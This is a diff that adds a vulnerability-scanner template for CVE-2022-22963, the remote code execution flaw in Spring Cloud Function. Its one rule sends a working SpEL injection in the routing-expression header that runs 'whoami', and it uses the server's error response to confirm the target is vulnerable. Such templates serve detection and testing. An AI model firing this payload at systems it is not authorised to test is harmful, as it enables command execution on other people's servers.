@@ -1,0 +1,43 @@
+name: Spring_Cloud_Function_SpEL_RCE_CVE_2022_22963
+transport: http
+set: {}
+detail:
+  dock: app="springboot" || body="Whitelabel Error Page"
+  product: Spring Cloud Function
+  homepage: https://spring.io/projects/spring-cloud-function
+  impact: In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions,
+    when using routing functionality it is possible for a user to provide a specially
+    crafted SpEL as a routing-expression that may result in remote code execution
+    and access to local resources.
+  description: 'Spring Cloud Function is a project with the following high-level goals:
+
+    Promote the implementation of business logic via functions.
+
+    Decouple the development lifecycle of business logic from any specific runtime
+    target so that the same code can run as a web endpoint, a stream processor, or
+    a task.
+
+    Support a uniform programming model across serverless providers, as well as the
+    ability to run standalone (locally or in a PaaS).
+
+    Enable Spring Boot features (auto-configuration, dependency injection, metrics)
+    on serverless providers.
+
+    It abstracts away all of the transport details and infrastructure, allowing the
+    developer to keep all the familiar tools and processes, and focus firmly on business
+    logic.'
+rules:
+  r1:
+    method: POST
+    path: /functionRouter
+    follow_redirects: true
+    headers:
+      Accept-Encoding: gzip, deflate
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("whoami")
+      Content-Type: text/plain
+    body: test
+    expression: response.status == 500 && response.body.bcontains(b'Internal Server Error')
+      && response.body.bcontains(b'functionRouter')
+expression: r1()
